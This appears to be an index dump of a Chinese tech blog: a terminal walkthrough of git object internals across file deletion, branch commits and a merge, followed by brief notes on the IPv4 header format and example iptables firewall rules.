622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── info\r└── pack\r11 directories, 10 files\rroot@aliyun:~/blog-delete# rm file1 # 删除file1\rroot@aliyun:~/blog-delete# git status\rOn branch master\rChanges not staged for commit:\r(use \"git add/rm \u003cfile\u003e...\" to update what will be committed)\r(use \"git checkout -- \u003cfile\u003e...\" to discard changes in working directory)\rdeleted: file1\rno changes added to commit (use \"git add\" and/or \"git commit -a\")\rroot@aliyun:~/blog-delete# git add file1 # 修改添加到 working tree\rroot@aliyun:~/blog-delete# tree .git/objects/ # 注意，此时的并没有删除或者增加 git objects\r.git/objects/\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── info\r└── pack\r11 directories, 10 files\rroot@aliyun:~/blog-delete# git status\rOn branch master\rChanges to be committed:\r(use \"git reset HEAD \u003cfile\u003e...\" to unstage)\rdeleted: file1\rroot@aliyun:~/blog-delete# git commit -m \"delete file1 on master\" # 提交这个修改到 repository\r[master f24e8b6] delete file1 on master\r1 file changed, 1 deletion(-)\rdelete mode 100644 file1\rroot@aliyun:~/blog-delete# tree .git/objects/ # 查看此时的 git objects\r.git/objects/\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c # blob:file1 仍然在 git objects 中\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba # 新添加一个 tree\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088 # 新添加一个 commit\r├── info\r└── pack\r13 directories, 12 files\rroot@aliyun:~/blog-delete# git cat-file -s ba61 # ba61 的大小,zlib compressed data\r66\rroot@aliyun:~/blog-delete# git cat-file -t ba61 # ba61 的类型\rtree\rroot@aliyun:~/blog-delete# git cat-file -p ba61\r100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2 # master 分支剩下的 file2\r100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3 # master 分支剩下的 file3\rroot@aliyun:~/blog-delete# git cat-file -s f24e\r207\rroot@aliyun:~/blog-delete# git cat-file -t f24e # 新加的 commit object\rcommit\rroot@aliyun:~/blog-delete# git cat-file -p f24e\rtree ba61ba35d824408f8135ec77b7efdcdfc0281fba # 新加的 tree object\rparent ce907fabd08138058b05428d7cac017507b33c44 # delete file1 之前的 commit object\rauthor root \u003croot@aliyun\u003e 1586307459 +0800\rcommitter root \u003croot@aliyun\u003e 1586307459 +0800\rdelete file1 on master\rroot@aliyun:~/blog-delete# cat .git/refs/heads/master # master 分支指向了新的 commit\rf24e8b6fb771347156b615c795f7fd886dc49088\rroot@aliyun:~/blog-delete# cat .git/logs/refs/heads/\rmaster new-branch root@aliyun:~/blog-delete# cat .git/logs/refs/heads/master # 查看 master 分支的提交日志\r0000000000000000000000000000000000000000 73622e96d5b5389d63dd74e3c40db9d4c4296ff5 root \u003croot@aliyun\u003e 1578027036 +0800 commit (initial): add file1 and file2\r73622e96d5b5389d63dd74e3c40db9d4c4296ff5 558e28c67089eea9bdfbfd748d32baa8f2ce944e root \u003croot@aliyun\u003e 1578036269 +0800 commit: modify file1\r558e28c67089eea9bdfbfd748d32baa8f2ce944e ce907fabd08138058b05428d7cac017507b33c44 root \u003croot@aliyun\u003e 1586241477 +0800 merge new-branch: Fast-forward\rce907fabd08138058b05428d7cac017507b33c44 f24e8b6fb771347156b615c795f7fd886dc49088 root \u003croot@aliyun\u003e 1586307459 +0800 commit: delete file1 on master master 分支删除 file1 图解 master 分支删除 file1 图解分析 master 分支 git 中删除一个文件的实质是：\n生成一个 tree object ba61ba，指向剩下的每一个文件的最新的 blob object。blob c20090 file2 和 blob 2e799a file3 生成一个 commit f24e8b 节点，指向本次提交的上一个 commit object(ce907f) 和这次提交生成的 tree object(ba61ba)。 移动 master 和 HEAD 的指向，指向本次提交的 commit object f24e8b。 在 master 的 .git/logs/refs/heads/master 分支添加本次提交的 git log。 删除 file1，但是 git object 下 file1 的 blob(58c9bd) 并没有删除。这也意味着可以恢复 file1。 其他分支同理。 合并分支(combine work) 使用 git merge Merging in Git creates a special commit that has two unique parents. A commit with two parents essentially means “I want to include all the work from this parent over here and this one over here, and the set of all their parents.”\nnew-branch 分支添加 file4 new-branch 分支添加 file4 步骤 root@aliyun:~# cd blog-delete\rroot@aliyun:~/blog-delete# ls\rfile2 file3\rroot@aliyun:~/blog-delete# git branch --list # 查看分支\r* master\rnew-branch\rroot@aliyun:~/blog-delete# git checkout new-branch # 切换到 new-branch\rSwitched to branch 'new-branch'\rroot@aliyun:~/blog-delete# ls\rfile1 file2 file3\rroot@aliyun:~/blog-delete# echo 444 \u003e file4 # 创建 file4\rroot@aliyun:~/blog-delete# git status\rOn branch new-branch\rUntracked files:\r(use \"git add \u003cfile\u003e...\" to include in what will be committed)\rfile4\rnothing added to commit but untracked files present (use \"git add\" to track)\rroot@aliyun:~/blog-delete# tree .git/objects/\r.git/objects/\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── info\r└── pack\r13 directories, 12 files\rroot@aliyun:~/blog-delete# git add file4 # 添加 file4\rroot@aliyun:~/blog-delete# tree .git/objects/\r.git/objects/\r├── 1e\r│ └── 6fd033863540bfb9eadf22019a6b4b3de7d07a # blob:file4\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── info\r└── pack\r14 directories, 13 files\rroot@aliyun:~/blog-delete# git commit -m \"add file4 on new-branch\"\r[new-branch c9918ce] add file4 on new-branch\r1 file changed, 1 insertion(+)\rcreate mode 100644 file4\rroot@aliyun:~/blog-delete# tree .git/objects/\r.git/objects/\r├── 09\r│ └── 77e7b9e8643eaa75b679d7e82b048723e9f491 # 4:tree\r├── 1e\r│ └── 6fd033863540bfb9eadf22019a6b4b3de7d07a # blob:file4\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── c9\r│ └── 918cea80e46648c4e98da5b1c4b072f0794795\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44 # 4:commit\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── info\r└── pack\r16 directories, 15 files\rroot@aliyun:~/blog-delete# git cat-file -s 0977 # 新加的 tree object\r132\rroot@aliyun:~/blog-delete# git cat-file -t 0977\rtree\rroot@aliyun:~/blog-delete# git cat-file -p 0977 # new-branch 分支上所有文件的 snapshot\r100644 blob 55bd0ac4c42e46cd751eb7405e12a35e61425550 file1\r100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2\r100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3\r100644 blob 1e6fd033863540bfb9eadf22019a6b4b3de7d07a file4\rroot@aliyun:~/blog-delete# git cat-file -s 1e6f # new-branch 分支新加的 file4\r4\rroot@aliyun:~/blog-delete# git cat-file -t 1e6f blob\rroot@aliyun:~/blog-delete# git cat-file -p 1e6f\r444\rroot@aliyun:~/blog-delete# git cat-file -s c991 # 新的 commit object\r208\rroot@aliyun:~/blog-delete# git cat-file -t c991\rcommit\rroot@aliyun:~/blog-delete# git cat-file -p c991\rtree 0977e7b9e8643eaa75b679d7e82b048723e9f491 # 本次生成的 tree object\rparent ce907fabd08138058b05428d7cac017507b33c44 # 上一次 commit\rauthor root \u003croot@aliyun\u003e 1586330993 +0800\rcommitter root \u003croot@aliyun\u003e 1586330993 +0800\radd file4 on new-branch # git commit-m 的信息\rroot@aliyun:~/blog-delete-new-branch-file4# git checkout master # 切换到 master\rSwitched to branch 'master'\rroot@aliyun:~/blog-delete-new-branch-file4# ls # 查看 master 分支的文件\rfile2 file3\rroot@aliyun:~/blog-delete-new-branch-file4# tree .git/objects/ # 在 master 分支查看 objects\r.git/objects/ # 和在 new-branch 分支上看到的一样\r├── 09\r│ └── 77e7b9e8643eaa75b679d7e82b048723e9f491\r├── 1e\r│ └── 6fd033863540bfb9eadf22019a6b4b3de7d07a\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── c9\r│ └── 918cea80e46648c4e98da5b1c4b072f0794795\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── info\r└── pack\r16 directories, 15 files new-branch 分支添加 file4 图解 master 分支添加 file5 master 分支添加 file5 步骤 root@aliyun:~# cp -r blog-delete blog-delete-master-file5 # 复制一份\rroot@aliyun:~# cd blog-delete-master-file5/\rroot@aliyun:~/blog-delete-master-file5# ls\rfile1 file2 file3 file4\rroot@aliyun:~/blog-delete-master-file5# git branch --list master\r* new-branch\rroot@aliyun:~/blog-delete-master-file5# git checkout master # 切换到 master\rSwitched to branch 'master'\rroot@aliyun:~/blog-delete-master-file5# echo 555 \u003e file5 创建 file5\rroot@aliyun:~/blog-delete-master-file5# tree .git/objects/\r.git/objects/\r├── 09\r│ └── 77e7b9e8643eaa75b679d7e82b048723e9f491\r├── 1e\r│ └── 6fd033863540bfb9eadf22019a6b4b3de7d07a\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── c9\r│ └── 918cea80e46648c4e98da5b1c4b072f0794795\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── info\r└── pack\r16 directories, 15 files\rroot@aliyun:~/blog-delete-master-file5# git add file5 root@aliyun:~/blog-delete-master-file5# tree .git/objects/\r.git/objects/\r├── 09\r│ └── 77e7b9e8643eaa75b679d7e82b048723e9f491\r├── 1e\r│ └── 6fd033863540bfb9eadf22019a6b4b3de7d07a\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 37\r│ └── 49383ded246790596d2f39db4dd8b71f525bbc\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── c9\r│ └── 918cea80e46648c4e98da5b1c4b072f0794795\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── info\r└── pack\r17 directories, 16 files\rroot@aliyun:~/blog-delete-master-file5# git commit -m \"add file5 on master\"\r[master 3de903f] add file5 on master\r1 file changed, 1 insertion(+)\rcreate mode 100644 file5\rroot@aliyun:~/blog-delete-master-file5# tree .git/objects/\r.git/objects/\r├── 09\r│ └── 77e7b9e8643eaa75b679d7e82b048723e9f491\r├── 1e\r│ └── 6fd033863540bfb9eadf22019a6b4b3de7d07a\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 37\r│ └── 49383ded246790596d2f39db4dd8b71f525bbc # blob:file5\r├── 3d\r│ └── e903f0c523d57b4880be68bacb1eaa1195ebac #5:commit\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── c9\r│ └── 918cea80e46648c4e98da5b1c4b072f0794795\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── f5\r│ └── 4ecef60b4376ae5531032cbeaade01184da4fa # 5:tree\r├── info\r└── pack\r19 directories, 18 files\rroot@aliyun:~/blog-delete-master-file5# git cat-file -t 3de90 # 本次的 commit object\rcommit\rroot@aliyun:~/blog-delete-master-file5# git cat-file -s 3de90\r204\rroot@aliyun:~/blog-delete-master-file5# git cat-file -p 3de90\rtree f54ecef60b4376ae5531032cbeaade01184da4fa\rparent f24e8b6fb771347156b615c795f7fd886dc49088\rauthor root \u003croot@aliyun\u003e 1586340888 +0800\rcommitter root \u003croot@aliyun\u003e 1586340888 +0800\radd file5 on master\rroot@aliyun:~/blog-delete-master-file5# git cat-file -t f54ece # 本次的 tree objet\rtree\rroot@aliyun:~/blog-delete-master-file5# git cat-file -s f54ece\r99\rroot@aliyun:~/blog-delete-master-file5# git cat-file -p f54ece\r100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2 # master 分支上的 file2\r100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3 # master 分支上的 file3\r100644 blob 3749383ded246790596d2f39db4dd8b71f525bbc file5 # master 分支上的 file5\rroot@aliyun:~/blog-delete-master-file5# git cat-file -t 374938 # file5\rblob\rroot@aliyun:~/blog-delete-master-file5# git cat-file -s 374938\r4\rroot@aliyun:~/blog-delete-master-file5# git cat-file -p 374938\r555 master 分支添加 file5 图解 master 分支合并到 new-branch 分支 master 分支合并到 new-branch 分支步骤 root@aliyun:~# cp -r blog-delete-master-file5/ blog-delete-file4-file5-merge\rroot@aliyun:~# cd blog-delete-file4-file5-merge/\rroot@aliyun:~/blog-delete-file4-file5-merge# git branch --list\r* master\rnew-branch\rroot@aliyun:~/blog-delete-file4-file5-merge# tree .git/objects/\r09/ 1e/ 2e/ 37/ 3d/ 55/ 58/ 61/ 73/ b7/ ba/ c2/ c9/ ce/ d9/ f2/ f5/ info/ pack/ root@aliyun:~/blog-delete-file4-file5-merge# tree .git/objects/\r.git/objects/\r├── 09\r│ └── 77e7b9e8643eaa75b679d7e82b048723e9f491\r├── 1e\r│ └── 6fd033863540bfb9eadf22019a6b4b3de7d07a\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 37\r│ └── 49383ded246790596d2f39db4dd8b71f525bbc\r├── 3d\r│ └── e903f0c523d57b4880be68bacb1eaa1195ebac\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── c9\r│ └── 918cea80e46648c4e98da5b1c4b072f0794795\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── f5\r│ └── 4ecef60b4376ae5531032cbeaade01184da4fa\r├── info\r└── pack\r19 directories, 18 files\rroot@aliyun:~/blog-delete-file4-file5-merge# git checkout new-branch # 切换到 new-branch\rSwitched to branch 'new-branch'\rroot@aliyun:~/blog-delete-file4-file5-merge# git merge master # 把 master 分支合并到当前分支，也就是 new-branch 分支\rRemoving file1 # master 分支上删除了 file1，new-branch 分支合并时也会删掉。\rMerge made by the 'recursive' strategy.\rfile1 | 1 -\rfile5 | 1 +\r2 files changed, 1 insertion(+), 1 deletion(-)\rdelete mode 100644 file1\rcreate mode 100644 file5\rroot@aliyun:~/blog-delete-file4-file5-merge# tree .git/objects/\r.git/objects/\r├── 09\r│ └── 77e7b9e8643eaa75b679d7e82b048723e9f491\r├── 1e\r│ └── 6fd033863540bfb9eadf22019a6b4b3de7d07a\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 37\r│ └── 49383ded246790596d2f39db4dd8b71f525bbc\r├── 3d\r│ └── e903f0c523d57b4880be68bacb1eaa1195ebac\r├── 4f\r│ └── ed41461bcfd7157b71d757b2fe70e3d7317f94 # 6:tree 合并生成的 tree object\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── ba\r│ └── 61ba35d824408f8135ec77b7efdcdfc0281fba\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── c9\r│ └── 918cea80e46648c4e98da5b1c4b072f0794795\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── f2\r│ └── 4e8b6fb771347156b615c795f7fd886dc49088\r├── f5\r│ └── 4ecef60b4376ae5531032cbeaade01184da4fa\r├── fc\r│ └── 094b5b4e7a0f4028c5735d95f844b1aea1a9b6 # 6:commit 合并生成的 commit object\r├── info\r└── pack\r21 directories, 20 files\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -s 4fed41\r132\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -t 4fed41\rtree\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -p 4fed41\r100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2 100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3\r100644 blob 1e6fd033863540bfb9eadf22019a6b4b3de7d07a file4\r100644 blob 3749383ded246790596d2f39db4dd8b71f525bbc file5\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -s fc094b # 本次合并生成的 commit object\r270\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -t fc094b\rcommit\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -p fc094b\rtree 4fed41461bcfd7157b71d757b2fe70e3d7317f94 # 本次合并时两个分支的 snapshot\rparent c9918cea80e46648c4e98da5b1c4b072f0794795 # new branch 分支合并时最新的 commit\rparent 3de903f0c523d57b4880be68bacb1eaa1195ebac # master 分支合并时最新的 commit\rauthor root \u003croot@aliyun\u003e 1586344983 +0800\rcommitter root \u003croot@aliyun\u003e 1586344983 +0800\rMerge branch 'master' into new-branch\rroot@aliyun:~/blog-delete-file4-file5-merge# cat .git/refs/heads/new-branch # new branch 已经指向了新生成的 commit 节点\rfc094b5b4e7a0f4028c5735d95f844b1aea1a9b6\rroot@aliyun:~/blog-delete-file4-file5-merge# cat .git/refs/heads/master # master 分支没有发生改变\r3de903f0c523d57b4880be68bacb1eaa1195ebac\rroot@aliyun:~/blog-delete-file4-file5-merge# cat .git/logs/refs/heads/new-branch # new branch 分支 log\r0000000000000000000000000000000000000000 558e28c67089eea9bdfbfd748d32baa8f2ce944e root \u003croot@aliyun\u003e 1578037705 +0800 branch: Created from master\r558e28c67089eea9bdfbfd748d32baa8f2ce944e ce907fabd08138058b05428d7cac017507b33c44 root \u003croot@aliyun\u003e 1578039532 +0800 commit: add file3 on new-branch\rce907fabd08138058b05428d7cac017507b33c44 c9918cea80e46648c4e98da5b1c4b072f0794795 root \u003croot@aliyun\u003e 1586330993 +0800 commit: add file4 on new-branch\rc9918cea80e46648c4e98da5b1c4b072f0794795 fc094b5b4e7a0f4028c5735d95f844b1aea1a9b6 root \u003croot@aliyun\u003e 1586344983 +0800 merge master: Merge made by the 'recursive' strategy. # 本次 merge 的 log master 分支合并到 new-branch 图解 master 分支合并到 new-branch 分支实质：\n生成一个新的 tree object 4f1d41 指向 master 分支和 new-branch 分支共有的文件 blob。 生成一个新的 commit object fc094b 指向新生成的 tree object 4f1d41以及合并前的 master 分支的 commit 和 new-branch 分支的 commit。 .git/refs/heads/new-branch指向新生成的 commit object fc094b。 .git/logs/refs/heads/new-branch 添加本次 merge 的 log。 .git/refs/heads/master master 分支的指向并没有发生改变。 Reference git-under-the-hood Bilibili-git-under-the-hood SHA-1 git-branch visual-git-reference visualized-useful-git-commands ","删除-master-分支上的-file1-文件然后提交#删除 master 分支上的 file1 文件，然后提交":"","合并分支combine-work#合并分支(combine work)":"","第一次-git-add--git-commit#第一次 git add | git commit":"","第三次-git-add--git-commit#第三次 git add | git commit":"","第二次-git-add--git-commit#第二次 git add | git commit":""},"title":"master-git"},"/blog/master-ip/":{"data":{"destination-ip-address32-bits#Destination IP Address(32 bits)":"0x ac:10:79:65 -\u003e 172.16.121.101","flags3-bits#Flags(3 bits)":"0x4 0100\n0 Reserved bit not set 1 Don’t fragment set 0 More fragments not set ","fragment-offset13-bits#Fragment Offset(13 bits)":" This field indicates where in the datagram this fragment belongs. The fragment offset is measured in units of 8 octets (64 bits). The first fragment has offset zero.\n0x000 (0000 0000 0000)","header-checksum16-bits#Header Checksum(16 bits)":"0x2e35","header-length4-bits#Header Length(4 bits)":"0x5(5)","identification16-bits#Identification(16 bits)":"0xd279","ip-datagram#Ip datagram":"","ip-header-format#IP header format":"","ipv4-example#IPV4 example":"","motivation#Motivation":"MotivationThe Internet Protocol is designed for use in interconnected systems of packet-switched computer communication networks. Such a system has been called a “catenet”. The internet protocol provides for transmitting blocks of data called datagrams from sources to destinations, where sources and destinations are hosts identified by fixed length addresses. The internet protocol also provides for fragmentation and reassembly of long datagrams, if necessary, for transmission through “small packet” networks.\nIPv4 is a connectionless protocol for use on packet-switched networks. It operates on a best effort delivery model, in that it does not guarantee delivery, nor does it assure proper sequencing or avoidance of duplicate delivery. These aspects, including data integrity, are addressed by an upper layer transport protocol, such as the Transmission Control Protocol (TCP).","protocal8-bits#Protocal(8 bits)":"0x06 TCP:(6)","references#References":" ip fragmentation and reassembly fragmentation \u0026 reassembly ip 重组 ","source-ip-address32-bits#Source IP Address(32 bits)":"0x 0a:fe:c9:ad -\u003e 10.254.201.173","time-to-livettl8-bits#Time to Live(TTL)(8 bits)":"0x80 TTL:(128)","total-length16-bits#Total Length(16 bits)":"0x28(40)","type-of-servicetos8-bits#Type Of Service(TOS)(8 bits)":"0x00(0)","version4-bits#version(4 bits)":"0x4(4)"},"title":"master-ip"},"/blog/master-iptables/":{"data":{"chain#chain":" each of these tables are composed of a few default chains. These chains allow you to filter packets at various points.\nPREROUTING INPUT OUTPUT FORWARD POSTROUTING ","iptables-examples#iptables examples":" -t 不指定，默认是 filter table. 为啥? filter 常用呗\nNew-chain Xdelete-chain List Insert Append Delete Replace Flush Policy jump match module source destination numeric 不进行 reverse dns lookup protocol input interface onput interface\nlist rules iptables -L –line-numbers\niptables -A INPUT -p tcp –dport 22 -j LOG\niptables -D INPUT -p tcp –dport 22 -j LOG\nappend rules iptables -A INPUT -s 221.194.47.0/24 -j REJECT delete rules iptables -D INPUT -s 221.194.47.0/24 -j REJECT iptables -D INPUT 12 iptables -D INPUT 9 iptables -F iptables -F INPUT insert/replace rules iptables -I INPUT 1 -s 114.114.114.114 -j ACCEPT iptables -R INPUT 1 -s 59.45.175.10 -J ACCEPT protocals/modules iptables -A INPUT -p tcp -m tcp -dport 22 -s 59.45.175.0/24 -j DROP iptables -A INPUT -p tcp -m multiport -dports 22,49101 -s 59.45.175.0/24 -j DROP iptables -A input -p icmp -m icmp -icmp-type 17 -j DROP connection tracking module change default policy iptables -P INPUT DROP iptables -t nat -P INPUT DROP custom chain iptables -N ssh-rules iptables -A ssh-rules -s 18.130.0.0./16 -j ACCEPT iptables -A ssh-rules -s 18.11.0.0/16 -j ACCEPT iptables -A ssh-rules -j DROP iptables -A INPUT -p tcp -m tcp –dport 22 -j ssh-rules ","iptables-三要素#iptables 三要素":"","references#References":" depth-guide-iptables-linux-firewall-强烈推荐 iptables-解析 iptables iptables-extensions ip-forward https://manned.org/iptables ","table#table":" tables allow you to do very specific things with packets. 